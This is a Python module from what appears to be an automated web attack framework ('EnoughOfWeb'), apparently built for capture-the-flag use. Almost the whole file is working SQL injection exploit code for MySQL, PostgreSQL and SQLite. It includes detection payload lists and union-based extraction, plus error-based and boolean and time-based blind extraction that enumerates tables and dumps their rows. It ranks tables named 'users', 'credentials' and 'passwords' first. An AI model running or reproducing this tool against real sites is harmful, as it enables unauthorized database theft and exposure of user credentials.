"""
EnoughOfWeb — SQL Injection Module
Covers: union-based, error-based, boolean blind (binary search), time-based blind.
Databases: MySQL, PostgreSQL, SQLite.
"""

import re
import time
import json
import os
from typing import List, Optional, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ---------------------------------------------------------------------------
# Inline payloads — the JSON file has an extended set
# ---------------------------------------------------------------------------

ERROR_DETECT_PAYLOADS = [
    "'",
    "''",
    "\"",
    "1'",
    "1\"",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR 1=1--",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
    "admin'--",
]

BOOLEAN_TRUE_PAYLOADS = [
    "' OR 1=1-- ",
    "' OR '1'='1'-- ",
    "\" OR 1=1-- ",
    "1 OR 1=1",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "') OR ('1'='1",
    "') OR 1=1-- ",
    "' OR 1=1-- -",
]

BOOLEAN_FALSE_PAYLOADS = [
    "' AND 1=2-- ",
    "' AND '1'='2'-- ",
    "\" AND 1=2-- ",
    "1 AND 1=2",
    "' AND 1=2#",
    "' AND '1'='2'#",
    "') AND 1=2-- ",
]

TIME_PAYLOADS = {
    "mysql": [
        "' OR SLEEP(5)-- ",
        "' AND SLEEP(5)-- ",
        "1' AND SLEEP(5)#",
        "') OR SLEEP(5)-- ",
        "1; SELECT SLEEP(5)-- ",
        "' OR BENCHMARK(5000000,SHA1('test'))-- ",
    ],
    "postgres": [
        "'; SELECT pg_sleep(5)-- ",
        "' OR 1=1; SELECT pg_sleep(5)-- ",
        "' AND 1=1; SELECT pg_sleep(5)-- ",
        "1; SELECT pg_sleep(5)-- ",
    ],
    "sqlite": [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- ",
    ],
}

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"syntax error at or near",
    r"unterminated string literal",
    r"SQLite3::query",
    r"sqlite3\.OperationalError",
    r"SQLITE_ERROR",
    r"near \".*?\": syntax error",
    r"SQL syntax.*?MySQL",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"ORA-\d{5}",
    r"Oracle.*?Driver",
    r"Microsoft.*?ODBC.*?SQL Server",
    r"Unclosed quotation mark after the character string",
    r"com\.mysql\.jdbc",
    r"org\.postgresql\.util\.PSQLException",
    r"unrecognized token",
    r"SQLSTATE\[",
    r"PDOException",
    r"Dynamic SQL Error",
]

UNION_COLUMNS_MAX = 15

COMMENT_STYLES = ["-- ", "#", "/**/"]

# Data extraction payloads per DB
EXTRACT_PAYLOADS = {
    "mysql": {
        "version": "SELECT @@version",
        "current_db": "SELECT database()",
        "tables": "SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
        "columns": "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
        "dump": "SELECT GROUP_CONCAT({columns} SEPARATOR 0x7c) FROM {table}",
    },
    "postgres": {
        "version": "SELECT version()",
        "current_db": "SELECT current_database()",
        "tables": "SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
        "columns": "SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='{table}'",
        "dump": "SELECT string_agg({columns},'|') FROM {table}",
    },
    "sqlite": {
        "version": "SELECT sqlite_version()",
        "current_db": "SELECT 'main'",
        "tables": "SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'",
        "columns": "SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('{table}')",
        "dump": "SELECT GROUP_CONCAT({columns},'|') FROM {table}",
    },
}

FLAG_TABLE_HINTS = [
    "flag", "flags", "secret", "secrets", "ctf", "key", "keys",
    "credentials", "users", "admin", "password", "passwords",
    "sensitive", "hidden", "treasure",
]


class SQLiExploit(BaseExploit):
    name = "sqli"
    description = "SQL Injection — union, error, boolean-blind (binary search), time-blind"
    priority = 1

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []

        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            url = point["url"]
            param = point["param"]
            method = point["method"]
            base_data = point.get("base_data", {})

            # 1. Error-based
            finding = self._detect_error_based(url, param, method, base_data)
            if finding:
                findings.append(finding)
                continue

            # 2. Boolean-based
            finding = self._detect_boolean_based(url, param, method, base_data)
            if finding:
                findings.append(finding)
                continue

            # 3. Time-based
            finding = self._detect_time_based(url, param, method, base_data)
            if finding:
                findings.append(finding)

        return findings

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    def exploit(self, finding: Finding) -> ExploitResult:
        vuln_type = finding.vuln_type
        try:
            if vuln_type == "error-based":
                return self._exploit_error_based(finding)
            elif vuln_type == "union-based":
                return self._exploit_union_based(finding)
            elif vuln_type == "boolean-blind":
                return self._exploit_boolean_blind(finding)
            elif vuln_type == "time-blind":
                return self._exploit_time_blind(finding)
            else:
                return self._exploit_union_based(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ==================================================================
    # Internal helpers
    # ==================================================================

    def _gather_injection_points(self, target_url: str, recon_data: dict) -> list:
        """Build a list of {url, param, method, base_data} dicts to test."""
        points = []
        seen = set()

        # From recon parameters
        for p in recon_data.get("parameters", []):
            key = (p.get("url", target_url), p["name"], p.get("location", "url"))
            if key in seen:
                continue
            seen.add(key)
            method = "GET" if p.get("location", "url") == "url" else "POST"
            points.append({
                "url": p.get("url", target_url),
                "param": p["name"],
                "method": method,
                "base_data": {},
            })

        # From recon forms
        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", {})
            for input_name in inputs:
                key = (form_url, input_name, method)
                if key in seen:
                    continue
                seen.add(key)
                points.append({
                    "url": form_url,
                    "param": input_name,
                    "method": method,
                    "base_data": dict(inputs),
                })

        # Fallback: try common param names against the URL
        if not points:
            for p in ["id", "page", "search", "q", "user", "name", "item", "cat", "order"]:
                points.append({
                    "url": target_url,
                    "param": p,
                    "method": "GET",
                    "base_data": {},
                })

        return points

    def _send_payload(self, url: str, param: str, method: str,
                      payload: str, base_data: dict = None, timeout: int = None):
        """Send a payload into `param` with WAF retry support. Returns response or None on error."""
        data = dict(base_data) if base_data else {}
        kwargs = {}
        if timeout:
            kwargs["timeout"] = timeout

        def _do_send(p: str):
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [p]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    return self._request("GET", test_url, **kwargs)
                else:
                    req_data = dict(data)
                    req_data[param] = p
                    return self._request("POST", url, data=req_data, **kwargs)
            except Exception:
                return None

        resp, used_payload, was_mutated = self._send_with_waf_retry(
            send_fn=_do_send,
            payload=payload,
            context="sql",
            target_url=url
        )
        return resp

    # ---------- Error-based detection ----------

    def _detect_error_based(self, url, param, method, base_data) -> Optional[Finding]:
        for payload in ERROR_DETECT_PAYLOADS:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue
            text = resp.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, text, re.IGNORECASE):
                    return Finding(
                        module=self.name,
                        vuln_type="error-based",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence=re.search(pattern, resp.text, re.IGNORECASE).group(0)[:200],
                        severity=Severity.HIGH,
                        extra={"db_hint": self._guess_db(resp.text)},
                    )
        return None

    # ---------- Boolean-based detection ----------

    def _detect_boolean_based(self, url, param, method, base_data) -> Optional[Finding]:
        # Get baseline
        baseline = self._send_payload(url, param, method, "1", base_data)
        if baseline is None:
            return None
        baseline_len = len(baseline.text)

        for true_payload, false_payload in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
            true_resp = self._send_payload(url, param, method, true_payload, base_data)
            false_resp = self._send_payload(url, param, method, false_payload, base_data)
            if true_resp is None or false_resp is None:
                continue

            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant difference between true/false but true close to baseline
            if abs(true_len - false_len) > 50 and abs(true_len - baseline_len) < 200:
                return Finding(
                    module=self.name,
                    vuln_type="boolean-blind",
                    target_url=url,
                    parameter=param,
                    method=method,
                    payload=true_payload,
                    evidence=f"TRUE response len={true_len}, FALSE response len={false_len}, baseline={baseline_len}",
                    severity=Severity.HIGH,
                    extra={
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "true_len": true_len,
                        "false_len": false_len,
                        "db_hint": self._guess_db(true_resp.text),
                    },
                )
        return None

    # ---------- Time-based detection ----------

    def _detect_time_based(self, url, param, method, base_data) -> Optional[Finding]:
        # Measure baseline timing
        start = time.time()
        self._send_payload(url, param, method, "1", base_data, timeout=15)
        baseline_time = time.time() - start

        threshold = baseline_time + 4  # Sleep(5) should add ~5s

        for db_type, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                start = time.time()
                try:
                    self._send_payload(url, param, method, payload, base_data, timeout=15)
                except Exception:
                    pass
                elapsed = time.time() - start

                if elapsed >= threshold:
                    return Finding(
                        module=self.name,
                        vuln_type="time-blind",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence=f"Response time {elapsed:.2f}s (baseline {baseline_time:.2f}s)",
                        severity=Severity.HIGH,
                        extra={"db_hint": db_type, "elapsed": elapsed, "baseline": baseline_time},
                    )
        return None

    # ==================================================================
    # Exploitation methods
    # ==================================================================

    def _exploit_error_based(self, finding: Finding) -> ExploitResult:
        """Try UNION-based extraction first, fall back to error-based extraction."""
        result = self._exploit_union_based(finding)
        if result.success:
            return result

        db_hint = finding.extra.get("db_hint", "mysql")
        url, param, method = finding.target_url, finding.parameter, finding.method
        base_data = finding.extra.get("base_data", {})
        all_data = []

        # extractvalue / updatexml error extraction (MySQL)
        if db_hint == "mysql":
            extract_payloads = [
                "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- ",
                "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- ",
                "' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- ",
            ]
            for p in extract_payloads:
                resp = self._send_payload(url, param, method, p, base_data)
                if resp:
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(success=True, flag=flag, payload_used=p, technique="error-based-extractvalue")
                    data = self._extract_error_data(resp.text)
                    if data:
                        all_data.append(data)

        if all_data:
            combined = "\n".join(all_data)
            flag = self._check_flag(combined)
            return ExploitResult(
                success=True,
                flag=flag,
                data_extracted=combined,
                technique="error-based",
                payload_used="extractvalue/updatexml",
            )

        return ExploitResult(success=False, error="Error-based extraction failed")

    def _exploit_union_based(self, finding: Finding) -> ExploitResult:
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        db_hint = finding.extra.get("db_hint", "mysql")

        # Step 1: Find column count using ORDER BY
        num_cols = self._find_column_count(url, param, method, base_data)
        if num_cols is None:
            return ExploitResult(success=False, error="Could not determine column count")

        # Step 2: Find which columns are reflected
        marker = "eow_marker_"
        nulls = ["NULL"] * num_cols
        reflected_col = None

        for comment in COMMENT_STYLES:
            for i in range(num_cols):
                test_nulls = list(nulls)
                test_nulls[i] = f"'{marker}{i}'"
                union_payload = f"' UNION SELECT {','.join(test_nulls)}{comment}"
                resp = self._send_payload(url, param, method, union_payload, base_data)
                if resp and f"{marker}{i}" in resp.text:
                    reflected_col = i
                    working_comment = comment
                    break
            if reflected_col is not None:
                break

        if reflected_col is None:
            # Try numeric markers for integer columns
            for comment in COMMENT_STYLES:
                for i in range(num_cols):
                    test_nulls = list(nulls)
                    test_nulls[i] = "7777"
                    union_payload = f"' UNION SELECT {','.join(test_nulls)}{comment}"
                    resp = self._send_payload(url, param, method, union_payload, base_data)
                    if resp and "7777" in resp.text:
                        reflected_col = i
                        working_comment = comment
                        break
                if reflected_col is not None:
                    break

        if reflected_col is None:
            return ExploitResult(success=False, error="No reflected column found in UNION")

        # Step 3: Extract data
        queries = EXTRACT_PAYLOADS.get(db_hint, EXTRACT_PAYLOADS["mysql"])
        all_data = []

        # Version
        result_data = self._union_extract(
            url, param, method, base_data, num_cols, reflected_col,
            working_comment, queries["version"]
        )
        if result_data:
            all_data.append(f"Version: {result_data}")
            flag = self._check_flag(result_data)
            if flag:
                return ExploitResult(success=True, flag=flag, data_extracted=result_data,
                                     payload_used=queries["version"], technique="union-based")

        # Current DB
        result_data = self._union_extract(
            url, param, method, base_data, num_cols, reflected_col,
            working_comment, queries["current_db"]
        )
        if result_data:
            all_data.append(f"Database: {result_data}")

        # Tables
        tables_raw = self._union_extract(
            url, param, method, base_data, num_cols, reflected_col,
            working_comment, queries["tables"]
        )
        tables = []
        if tables_raw:
            tables = [t.strip() for t in tables_raw.split(",") if t.strip()]
            all_data.append(f"Tables: {tables_raw}")

        # Prioritise flag-like tables
        priority_tables = [t for t in tables if any(h in t.lower() for h in FLAG_TABLE_HINTS)]
        other_tables = [t for t in tables if t not in priority_tables]
        ordered_tables = priority_tables + other_tables

        for table in ordered_tables[:10]:
            cols_raw = self._union_extract(
                url, param, method, base_data, num_cols, reflected_col,
                working_comment, queries["columns"].format(table=table)
            )
            if not cols_raw:
                continue
            cols = [c.strip() for c in cols_raw.split(",") if c.strip()]
            all_data.append(f"Columns in {table}: {cols_raw}")

            dump_cols = ",".join(cols[:5])
            dump_query = queries["dump"].format(columns=dump_cols, table=table)
            dump_data = self._union_extract(
                url, param, method, base_data, num_cols, reflected_col,
                working_comment, dump_query
            )
            if dump_data:
                all_data.append(f"Data from {table}: {dump_data}")
                flag = self._check_flag(dump_data)
                if flag:
                    return ExploitResult(
                        success=True, flag=flag,
                        data_extracted="\n".join(all_data),
                        payload_used=dump_query,
                        technique="union-based",
                    )

        combined = "\n".join(all_data)
        flag = self._check_flag(combined)
        return ExploitResult(
            success=bool(all_data),
            flag=flag,
            data_extracted=combined if all_data else None,
            technique="union-based",
        )

    def _exploit_boolean_blind(self, finding: Finding) -> ExploitResult:
        """Extract data char-by-char using binary search."""
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        db_hint = finding.extra.get("db_hint", "mysql")

        # Determine true/false response length signatures
        true_payload = finding.extra.get("true_payload", "' OR 1=1-- ")
        false_payload = finding.extra.get("false_payload", "' AND 1=2-- ")
        true_resp = self._send_payload(url, param, method, true_payload, base_data)
        false_resp = self._send_payload(url, param, method, false_payload, base_data)
        if not true_resp or not false_resp:
            return ExploitResult(success=False, error="Cannot establish true/false baseline")

        true_len = len(true_resp.text)
        false_len = len(false_resp.text)

        def is_true(payload_str: str) -> bool:
            resp = self._send_payload(url, param, method, payload_str, base_data)
            if resp is None:
                return False
            return abs(len(resp.text) - true_len) < abs(len(resp.text) - false_len)

        # Binary search one character
        def extract_char(query: str, position: int) -> Optional[str]:
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                test = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- "
                if is_true(test):
                    low = mid + 1
                else:
                    test_eq = f"' AND ASCII(SUBSTRING(({query}),{position},1))={mid}-- "
                    if is_true(test_eq):
                        return chr(mid)
                    high = mid - 1
            return None

        def extract_string(query: str, max_len: int = 100) -> str:
            result = []
            for pos in range(1, max_len + 1):
                ch = extract_char(query, pos)
                if ch is None:
                    break
                result.append(ch)
                # Early stop
                current = "".join(result)
                flag = self._check_flag(current)
                if flag:
                    return current
            return "".join(result)

        all_data = []
        queries = EXTRACT_PAYLOADS.get(db_hint, EXTRACT_PAYLOADS["mysql"])

        # Extract version
        version = extract_string(queries["version"], 50)
        if version:
            all_data.append(f"Version: {version}")

        # Extract current db
        current_db = extract_string(queries["current_db"], 50)
        if current_db:
            all_data.append(f"Database: {current_db}")

        # Extract tables
        tables_raw = extract_string(queries["tables"], 200)
        if tables_raw:
            all_data.append(f"Tables: {tables_raw}")
            tables = [t.strip() for t in tables_raw.split(",") if t.strip()]
            priority_tables = [t for t in tables if any(h in t.lower() for h in FLAG_TABLE_HINTS)]

            for table in priority_tables[:3]:
                cols_raw = extract_string(queries["columns"].format(table=table), 200)
                if cols_raw:
                    all_data.append(f"Columns in {table}: {cols_raw}")
                    cols = [c.strip() for c in cols_raw.split(",")][:3]
                    dump_query = queries["dump"].format(columns=",".join(cols), table=table)
                    dump_data = extract_string(dump_query, 300)
                    if dump_data:
                        all_data.append(f"Data from {table}: {dump_data}")
                        flag = self._check_flag(dump_data)
                        if flag:
                            return ExploitResult(
                                success=True, flag=flag,
                                data_extracted="\n".join(all_data),
                                technique="boolean-blind-binary-search",
                            )

        combined = "\n".join(all_data)
        flag = self._check_flag(combined)
        return ExploitResult(
            success=bool(all_data),
            flag=flag,
            data_extracted=combined if all_data else None,
            technique="boolean-blind-binary-search",
        )

    def _exploit_time_blind(self, finding: Finding) -> ExploitResult:
        """Extract data char-by-char using time-based binary search."""
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        db_hint = finding.extra.get("db_hint", "mysql")

        sleep_time = 2
        threshold = finding.extra.get("baseline", 1.0) + sleep_time - 0.5

        def is_true(payload_str: str) -> bool:
            start = time.time()
            try:
                self._send_payload(url, param, method, payload_str, base_data, timeout=15)
            except Exception:
                pass
            elapsed = time.time() - start
            return elapsed >= threshold

        # Build time-conditional payload based on db type
        if db_hint == "postgres":
            cond_template = "' AND (CASE WHEN (ASCII(SUBSTRING(({query}),{pos},1))>{mid}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END)='1"
            cond_eq_template = "' AND (CASE WHEN (ASCII(SUBSTRING(({query}),{pos},1))={mid}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END)='1"
        elif db_hint == "sqlite":
            cond_template = "' AND (CASE WHEN (UNICODE(SUBSTR(({query}),{pos},1))>{mid}) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1 END)-- "
            cond_eq_template = "' AND (CASE WHEN (UNICODE(SUBSTR(({query}),{pos},1))={mid}) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1 END)-- "
        else:  # mysql default
            cond_template = "' AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},SLEEP({sleep}),0)-- "
            cond_eq_template = "' AND IF(ASCII(SUBSTRING(({query}),{pos},1))={mid},SLEEP({sleep}),0)-- "

        def extract_char(query: str, position: int) -> Optional[str]:
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                test = cond_template.format(query=query, pos=position, mid=mid, sleep=sleep_time)
                if is_true(test):
                    low = mid + 1
                else:
                    test_eq = cond_eq_template.format(query=query, pos=position, mid=mid, sleep=sleep_time)
                    if is_true(test_eq):
                        return chr(mid)
                    high = mid - 1
            return None

        def extract_string(query: str, max_len: int = 60) -> str:
            result = []
            for pos in range(1, max_len + 1):
                ch = extract_char(query, pos)
                if ch is None:
                    break
                result.append(ch)
                current = "".join(result)
                flag = self._check_flag(current)
                if flag:
                    return current
            return "".join(result)

        all_data = []
        queries = EXTRACT_PAYLOADS.get(db_hint, EXTRACT_PAYLOADS["mysql"])

        version = extract_string(queries["version"], 30)
        if version:
            all_data.append(f"Version: {version}")

        current_db = extract_string(queries["current_db"], 30)
        if current_db:
            all_data.append(f"Database: {current_db}")

        tables_raw = extract_string(queries["tables"], 150)
        if tables_raw:
            all_data.append(f"Tables: {tables_raw}")
            tables = [t.strip() for t in tables_raw.split(",") if t.strip()]
            priority_tables = [t for t in tables if any(h in t.lower() for h in FLAG_TABLE_HINTS)]

            for table in priority_tables[:2]:
                cols_raw = extract_string(queries["columns"].format(table=table), 100)
                if cols_raw:
                    all_data.append(f"Columns in {table}: {cols_raw}")
                    cols = [c.strip() for c in cols_raw.split(",")][:3]
                    dump_query = queries["dump"].format(columns=",".join(cols), table=table)
                    dump_data = extract_string(dump_query, 200)
                    if dump_data:
                        all_data.append(f"Data from {table}: {dump_data}")
                        flag = self._check_flag(dump_data)
                        if flag:
                            return ExploitResult(
                                success=True, flag=flag,
                                data_extracted="\n".join(all_data),
                                technique="time-blind-binary-search",
                            )

        combined = "\n".join(all_data)
        flag = self._check_flag(combined)
        return ExploitResult(
            success=bool(all_data),
            flag=flag,
            data_extracted=combined if all_data else None,
            technique="time-blind-binary-search",
        )

    # ==================================================================
    # Utility helpers
    # ==================================================================

    def _find_column_count(self, url, param, method, base_data) -> Optional[int]:
        """Use ORDER BY to find column count."""
        for comment in COMMENT_STYLES:
            low, high = 1, UNION_COLUMNS_MAX
            last_valid = None
            for n in range(1, UNION_COLUMNS_MAX + 1):
                payload = f"' ORDER BY {n}{comment}"
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                text = resp.text.lower()
                if any(re.search(p, text, re.IGNORECASE) for p in SQL_ERROR_PATTERNS):
                    if last_valid:
                        return last_valid
                    break
                last_valid = n

            if last_valid and last_valid > 0:
                return last_valid

        # Fallback: try UNION SELECT NULL incrementally
        for comment in COMMENT_STYLES:
            for n in range(1, UNION_COLUMNS_MAX + 1):
                nulls = ",".join(["NULL"] * n)
                payload = f"' UNION SELECT {nulls}{comment}"
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                text = resp.text.lower()
                if not any(re.search(p, text, re.IGNORECASE) for p in SQL_ERROR_PATTERNS):
                    return n
        return None

    def _union_extract(self, url, param, method, base_data,
                       num_cols, reflected_col, comment, query) -> Optional[str]:
        """Run a subquery via UNION SELECT and extract the reflected output."""
        nulls = ["NULL"] * num_cols
        nulls[reflected_col] = f"({query})"
        union_part = ",".join(nulls)
        payload = f"' UNION SELECT {union_part}{comment}"
        resp = self._send_payload(url, param, method, payload, base_data)
        if resp is None:
            return None
        flag = self._check_flag(resp.text)
        if flag:
            return flag
        # Try to extract the data from the response (look for new content)
        return self._extract_injected_data(resp.text)

    def _extract_injected_data(self, text: str) -> Optional[str]:
        """Try to pull unique data from a UNION response."""
        # Look for common delimiters from GROUP_CONCAT
        patterns = [
            r"([a-zA-Z0-9_]+(?:,[a-zA-Z0-9_]+){1,})",  # comma-sep list
            r"([a-zA-Z0-9_]+(?:\|[a-zA-Z0-9_]+){1,})",  # pipe-sep list
        ]
        for p in patterns:
            matches = re.findall(p, text)
            if matches:
                longest = max(matches, key=len)
                return longest
        return None

    def _extract_error_data(self, text: str) -> Optional[str]:
        """Extract data from error-based responses (extractvalue / updatexml)."""
        patterns = [
            r"XPATH syntax error:\s*'~(.*?)~'",
            r"XPATH syntax error:\s*'(.*?)'",
            r"extractvalue.*?'~(.*?)~'",
            r"updatexml.*?'~(.*?)~'",
        ]
        for p in patterns:
            m = re.search(p, text, re.IGNORECASE | re.DOTALL)
            if m:
                return m.group(1)
        return None

    def _guess_db(self, text: str) -> str:
        """Guess the database from error messages."""
        text_lower = text.lower()
        if any(kw in text_lower for kw in ["mysql", "mariadb", "com.mysql"]):
            return "mysql"
        if any(kw in text_lower for kw in ["postgresql", "pg_", "psql"]):
            return "postgres"
        if any(kw in text_lower for kw in ["sqlite", "sqlite3"]):
            return "sqlite"
        if any(kw in text_lower for kw in ["ora-", "oracle"]):
            return "mysql"  # fallback
        return "mysql"
